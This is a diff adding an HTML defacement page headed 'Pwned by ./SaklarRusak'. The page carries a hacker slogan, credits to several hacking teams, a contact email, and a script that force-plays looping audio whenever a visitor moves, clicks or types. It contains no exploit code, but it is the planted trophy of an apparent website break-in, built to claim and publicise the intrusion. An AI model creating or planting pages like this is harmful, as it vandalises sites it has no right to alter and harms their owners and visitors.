@@ -1,0 +1,61 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Pwned by ./SaklarRusak</title>
+    <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRBDYn8Yfom9-VJ26jkUHBx3PmULohDzH8IjA&s">
+    <meta name="description" content="hellow I'm here">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { background-color:#000000; color: white; margin: 0; padding: 0; }
+        center { margin-top: 50px; }
+        font { font-family: Courier; }
+        #audio-container { display: none; }
+    </style>
+</head>
+<body onclick="playAudio()" onkeypress="playAudio()" onmousemove="playAudio()">
+
+    <center>
+        <img src="https://giffiles.alphacoders.com/258/2581.gif" width="300" height="300">
+        <br>
+        <font size="5">Pwned by ./SaklarRusak</font>
+        <br>
+        <br>
+        <font size="2">When you're on vacation, it's okay to do a little hacking</font>
+        <br><br>
+        <font size="1" color="gray">thanks to : K4puyu4k - Hilisia - chinafans CandySec - Mandrake - LOST3R </font> <br>
+        <font size="1" color="red">[ TSecNetwork Team - 0xteam - Toxic Security Team - Ayyildiz Team ] </font>
+        <br><br> <br><br> <br><br>
+        <font size="1">severityhunting1337@protonmail.com</font>
+    </center>
+
+    <div id="audio-container">
+        <audio id="defaceAudio" loop>
+            <source src="https://raw.githubusercontent.com/tengahnight-prot00col/muzik/refs/heads/main/TSecNetwork%20IQ.mp3" type="audio/mpeg">
+        </audio>
+    </div>
+
+    <script>
+        var audio = document.getElementById("defaceAudio");
+        var hasPlayed = false;
+
+        function playAudio() {
+            if (!hasPlayed) {
+                audio.play().then(() => {
+                    hasPlayed = true;
+                    console.log("fuck_console: Audio Force Started.");
+                }).catch(error => {
+                  
+                    console.log("fuck_console: Waiting for user interaction...");
+                });
+            }
+        }
+
+        
+        window.addEventListener('load', function() {
+            playAudio();
+        });
+    </script>
+
+</body>
+</html>
